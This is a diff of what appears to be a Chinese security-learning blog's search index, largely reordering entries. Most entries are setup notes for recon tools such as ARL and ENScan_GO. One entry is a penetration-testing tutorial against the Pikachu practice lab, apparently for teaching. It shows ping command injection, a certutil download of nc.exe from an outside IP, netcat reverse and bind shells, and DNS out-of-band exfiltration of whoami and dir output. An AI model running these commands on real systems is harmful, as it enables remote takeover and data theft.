+<p><a href="https://www.bilibili.com/video/av294466459">Pikachu靶场搭建</a></p>
+<p>Pikachu靶场ping命令漏洞</p>
+<ol>
+<li><p>判断系统，admin是Windows，root是Liunx</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | <span class="built_in">whoami</span> <span class="comment">#来判断</span></span><br></pre></td></tr></table></figure>
+<p>返回了izy05lwempmv08z\administrator，所以一看是windows</p>
+</li>
+<li><p>Windows没有自带的nc<br>需要使用到自己的nc下载地址，让对方下载，<a href="https://forum.ywhack.com/shell.php">反弹Shell命令生成</a></p>
+</li>
+<li><p>让他从我的地址下载nc到c盘<br>输入我的nc下载地址，执行成一条命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://8.208.28.234:80/nc.exe c:\\nc.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>nc下载成功，反弹，以下两种都可执行<br>127.0.0.1 | c:\nc.exe -e cmd -lvp 5566<br>127.0.0.1 | c:\nc -e cmd 8.208.101.45 5566<br>ncat 8.208.28.234 5566<br>ncat -lvp 5566</p>
+</li>
+</ol>
+<br>
+Windows服务器防火墙策略:
+开启防火墙5566入站策略，就只能主动出去
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | c:\\nc -e cmd 8.208.101.45 5566</span><br><span class="line">ncat -lvp 5566</span><br></pre></td></tr></table></figure>
+
+<p>开启防火墙5566出站策略，就只能等别人主动进来</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc -e cmd -lvvp 5566</span><br><span class="line">ncat -e cmd 47.122.23.131 5566</span><br></pre></td></tr></table></figure>
+<br>
+
+
+
+
+
+<h2 id="4：已知有漏洞数据不回显-带外查询Dig"><a href="#4：已知有漏洞数据不回显-带外查询Dig" class="headerlink" title="4：已知有漏洞数据不回显-带外查询Dig"></a>4：已知有漏洞数据不回显-带外查询Dig</h2><p>已知漏洞有，但是数据不回显：</p>
+<ol>
+<li>反弹shell</li>
+<li>带外查询（带外查询还可以绕过防火墙，无回显，就使用<a href="https://dig.pm/">Dig</a>网站看带外数据）</li>
+</ol>
+<p>Pikachu靶场ping命令，数据不回显</p>
+<p>linux可以尝试使用带外查询网站：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping \`<span class="built_in">whoami</span>`.47fa801887.ipv6.1433.eu.org. </span><br></pre></td></tr></table></figure>
+<p>可以带外出whoami命令 (‘ ‘这个管道符，只有在linux存在)</p>
+<p>windows的cmd不识别</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping \`<span class="built_in">whoami</span>`.47fa801887.ipv6.1433.eu.org.</span><br></pre></td></tr></table></figure>
+<p>并且cmd不支持赋值变量，但是PowerShell可以</p>
+<p>所以用PowerShell赋值whoami，然后使用带外网站再赋值网址，把数据带出来<br>但是由于Windows系统，结果带有“\” 导致ping无法执行<br>需要replace ‘&#39;为字母<br>最后就可以结果带出来了，ping到带外网站就可以直接带出Windows的数据了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="built_in">whoami</span></span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span></span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span></span><br><span class="line">ping <span class="variable">$z</span></span><br><span class="line"></span><br><span class="line">127.0.0.1 | powershell <span class="variable">$x</span>=<span class="built_in">dir</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>基础入门</category>
       </categories>
@@ -1568,6 +1626,28 @@
       </categories>
   </entry>
   <entry>
+    <title>ARL</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ARL/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>ARL旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>阿里云，购买Ubuntu 18.04服务器</p>
+</li>
+<li><p>进入Ubuntu服务器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>参考<a href="https://tophanttechnology.github.io/ARL-doc/system_install/">官方文档</a>执行命令即可</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>综合架构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护</title>
     <url>/2024/03/10/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A88/</url>
     <content><![CDATA[<h2 id="传输数据-编码型-加密型等"><a href="#传输数据-编码型-加密型等" class="headerlink" title="传输数据-编码型&amp;加密型等"></a>传输数据-编码型&amp;加密型等</h2><p>为什么要了解，数据在传输的时候进行编码？<br>对方服务器在接收的时候，进行解码再带入<br>如果不对自己的Payload代码进行同样编码的话，传入过去的数据别人不认识，测试无效</p>
@@ -1621,6 +1701,26 @@
       </categories>
   </entry>
   <entry>
+    <title>AsamF</title>
+    <url>/2024/03/12/%E5%B7%A5%E5%85%B7AsamF/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Kento-Sec/AsamF">AsamF</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>AsamF是一款集成多个网络资产测绘平台的一站式企业信息资产收集工具。</p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>根目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AsamF_windows_amd64 -h</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打开C:\Users.config\asamf的文件进行配置</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>网络空间</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>算法逆向&amp;散列对称非对称&amp;JS源码逆向&amp;AES&amp;DES&amp;RSA&amp;SHA</title>
     <url>/2024/03/10/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A89/</url>
     <content><![CDATA[<h2 id="安全测试流程："><a href="#安全测试流程：" class="headerlink" title="安全测试流程："></a>安全测试流程：</h2><p>有源码直接看源码，分析算法（后端必须要有源码才能彻底知道）<br>没有源码1. 猜识别 2. 看前端JS（加密逻辑是不是在前端）</p>
@@ -1670,86 +1770,6 @@
       </categories>
   </entry>
   <entry>
-    <title>反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A85/</url>
-    <content><![CDATA[<h2 id="常规基本渗透详解"><a href="#常规基本渗透详解" class="headerlink" title="常规基本渗透详解"></a>常规基本渗透详解</h2><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">渗透测试常用命令</a><br><a href="https://www.cnblogs.com/sunny11/p/13583083.html">渗透测试常用术语</a><br><br></p>
-<h2 id="1：文件上传下载-解决无图形化-解决数据传输"><a href="#1：文件上传下载-解决无图形化-解决数据传输" class="headerlink" title="1：文件上传下载-解决无图形化&amp;解决数据传输"></a>1：文件上传下载-解决无图形化&amp;解决数据传输</h2><p><a href="https://forum.ywhack.com/bountytips.php?download">文件下载命令生成</a><br>Linux：wget curl python ruby perl java等<br>Windows：powershell citsadmin msiexec等<br><br></p>
-<h2 id="2：反弹Shell命令-解决数据回显-解决数据通讯"><a href="#2：反弹Shell命令-解决数据回显-解决数据通讯" class="headerlink" title="2：反弹Shell命令-解决数据回显&amp;解决数据通讯"></a>2：反弹Shell命令-解决数据回显&amp;解决数据通讯</h2><p><a href="https://forum.ywhack.com/shell.php">反弹Shell命令生成</a><br>正向连接：我主动连接，对方本地监听，就是正向，（只要是主动出去的都是正向）<br>反向连接：对方主动给出去，我本地监听（找内网，只能反向）</p>
-<p>Windows（得注意看谁控制谁先）<br>把cmd放到5566端口（L控W）：nc -e cmd -lvp 5566<br>主动连接对方5566端口（W控L）：nc 8.208.101.45 5566</p>
-<p>主动把cmd放到对方5566端口（L控W）：nc -e cmd 8.208.101.45 5566<br>监听5566端口（W控L）：nc -lvp 5566<br><br></p>
-<p>Linux（得注意看谁控制谁先）<br>主动连接对方5566端口（L控W）：ncat 8.208.28.234 5566<br>把SH放到5566端口（W控L）：ncat -e &#x2F;bin&#x2F;sh -lvp 5566</p>
-<p>监听5566连接（L控W）：ncat -lvp 5566<br>主动把SH放到对方5566端口（W控L）：ncat -e &#x2F;bin&#x2F;sh 8.208.28.234 5566<br><br></p>
-<h2 id="3：防火墙绕过-正向连接-反向连接-内网服务器"><a href="#3：防火墙绕过-正向连接-反向连接-内网服务器" class="headerlink" title="3：防火墙绕过- 正向连接&amp;反向连接&amp;内网服务器"></a>3：防火墙绕过- 正向连接&amp;反向连接&amp;内网服务器</h2><p>Windows管道符：<br>| （将左边命令的输出作为右边命令的输入）<br>&amp;（执行左边的命令，然后执行右边的命令，不考虑左边命令的成功或失败）<br>||（只有当左边的命令失败执行后，才会执行右边的命令）<br>&amp;&amp;（只有当左边的命令成功执行后，才会执行右边的命令）</p>
-<p>Linux管道符：<br>; （执行左边的命令，然后执行右边的命令，不考虑左边命令的成功或失败）<br>| （将一个命令的输出作为另一个命令的输入）<br>|| （只有当左边的命令失败执行后，才会执行右边的命令。）<br>&amp; （在后台执行命令，不会阻塞当前的 shell）<br>&amp;&amp; （只有当左边的命令成功执行后，才会执行右边的命令）<br>&#96;&#96;（命令替换。执行括在其中的命令，并将其输出替换到原位置）<br><br></p>
-<p><a href="https://www.bilibili.com/video/av294466459">Pikachu靶场搭建</a></p>
-<p>Pikachu靶场ping命令漏洞</p>
-<ol>
-<li><p>判断系统，admin是Windows，root是Liunx</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | <span class="built_in">whoami</span> <span class="comment">#来判断</span></span><br></pre></td></tr></table></figure>
-<p>返回了izy05lwempmv08z\administrator，所以一看是windows</p>
-</li>
-<li><p>Windows没有自带的nc<br>需要使用到自己的nc下载地址，让对方下载，<a href="https://forum.ywhack.com/shell.php">反弹Shell命令生成</a></p>
-</li>
-<li><p>让他从我的地址下载nc到c盘<br>输入我的nc下载地址，执行成一条命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://8.208.28.234:80/nc.exe c:\\nc.exe</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>nc下载成功，反弹，以下两种都可执行<br>127.0.0.1 | c:\nc.exe -e cmd -lvp 5566<br>127.0.0.1 | c:\nc -e cmd 8.208.101.45 5566<br>ncat 8.208.28.234 5566<br>ncat -lvp 5566</p>
-</li>
-</ol>
-<br>
-Windows服务器防火墙策略:
-开启防火墙5566入站策略，就只能主动出去
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | c:\\nc -e cmd 8.208.101.45 5566</span><br><span class="line">ncat -lvp 5566</span><br></pre></td></tr></table></figure>
-
-<p>开启防火墙5566出站策略，就只能等别人主动进来</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc -e cmd -lvvp 5566</span><br><span class="line">ncat -e cmd 47.122.23.131 5566</span><br></pre></td></tr></table></figure>
-<br>
-
-
-
-
-
-<h2 id="4：已知有漏洞数据不回显-带外查询Dig"><a href="#4：已知有漏洞数据不回显-带外查询Dig" class="headerlink" title="4：已知有漏洞数据不回显-带外查询Dig"></a>4：已知有漏洞数据不回显-带外查询Dig</h2><p>已知漏洞有，但是数据不回显：</p>
-<ol>
-<li>反弹shell</li>
-<li>带外查询（带外查询还可以绕过防火墙，无回显，就使用<a href="https://dig.pm/">Dig</a>网站看带外数据）</li>
-</ol>
-<p>Pikachu靶场ping命令，数据不回显</p>
-<p>linux可以尝试使用带外查询网站：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping \`<span class="built_in">whoami</span>`.47fa801887.ipv6.1433.eu.org. </span><br></pre></td></tr></table></figure>
-<p>可以带外出whoami命令 (‘ ‘这个管道符，只有在linux存在)</p>
-<p>windows的cmd不识别</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping \`<span class="built_in">whoami</span>`.47fa801887.ipv6.1433.eu.org.</span><br></pre></td></tr></table></figure>
-<p>并且cmd不支持赋值变量，但是PowerShell可以</p>
-<p>所以用PowerShell赋值whoami，然后使用带外网站再赋值网址，把数据带出来<br>但是由于Windows系统，结果带有“\” 导致ping无法执行<br>需要replace ‘&#39;为字母<br>最后就可以结果带出来了，ping到带外网站就可以直接带出Windows的数据了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="built_in">whoami</span></span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span></span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span></span><br><span class="line">ping <span class="variable">$z</span></span><br><span class="line"></span><br><span class="line">127.0.0.1 | powershell <span class="variable">$x</span>=<span class="built_in">dir</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ARL</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ARL/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>ARL旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>阿里云，购买Ubuntu 18.04服务器</p>
-</li>
-<li><p>进入Ubuntu服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>参考<a href="https://tophanttechnology.github.io/ARL-doc/system_install/">官方文档</a>执行命令即可</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>综合架构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Burp Suite</title>
     <url>/2024/03/09/%E5%B7%A5%E5%85%B7Burp%20Suite/</url>
     <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://pan.baidu.com/s/1HsHU-JuEfIs--7ZuYLYFmw?pwd=ofox">One-Fox</a></p>
@@ -1790,26 +1810,6 @@ Windows服务器防火墙策略:
       </tags>
   </entry>
   <entry>
-    <title>AsamF</title>
-    <url>/2024/03/12/%E5%B7%A5%E5%85%B7AsamF/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Kento-Sec/AsamF">AsamF</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>AsamF是一款集成多个网络资产测绘平台的一站式企业信息资产收集工具。</p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>根目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AsamF_windows_amd64 -h</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>打开C:\Users.config\asamf的文件进行配置</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>网络空间</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Charles</title>
     <url>/2024/03/10/%E5%B7%A5%E5%85%B7Charles/</url>
     <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.charlesproxy.com/">Charles</a></p>
@@ -1835,25 +1835,23 @@ Windows服务器防火墙策略:
       </tags>
   </entry>
   <entry>
-    <title>ENScan_GO</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ENScan_GO/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</p>
+    <title>F8x</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7F8x/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景，渗透，开发，代理环境，服务可选项等。</p>
 <h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>根目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enscan-0.0.10-windows-amd64.exe -v</span><br></pre></td></tr></table></figure>
+<li><p>阿里云，购买Ubuntu 18.04服务器</p>
 </li>
-<li><p>打开目录下生成的配置文件</p>
-</li>
-<li><p>登录各个网站，然后复制出cookie进行配置</p>
-</li>
+<li><p>连接Ubuntu服务器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -h</span><br></pre></td></tr></table></figure>
+<br></li>
 </ol>
 ]]></content>
       <categories>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>企查信息</tag>
+        <tag>武器库部署</tag>
       </tags>
   </entry>
   <entry>
@@ -1902,26 +1900,6 @@ Windows服务器防火墙策略:
       </categories>
       <tags>
         <tag>Github监控</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>F8x</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7F8x/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景，渗透，开发，代理环境，服务可选项等。</p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>阿里云，购买Ubuntu 18.04服务器</p>
-</li>
-<li><p>连接Ubuntu服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -h</span><br></pre></td></tr></table></figure>
-<br></li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>武器库部署</tag>
       </tags>
   </entry>
   <entry>
@@ -1990,6 +1968,28 @@ Windows服务器防火墙策略:
       </categories>
       <tags>
         <tag>综合架构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ENScan_GO</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ENScan_GO/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>根目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enscan-0.0.10-windows-amd64.exe -v</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打开目录下生成的配置文件</p>
+</li>
+<li><p>登录各个网站，然后复制出cookie进行配置</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>企查信息</tag>
       </tags>
   </entry>
   <entry>
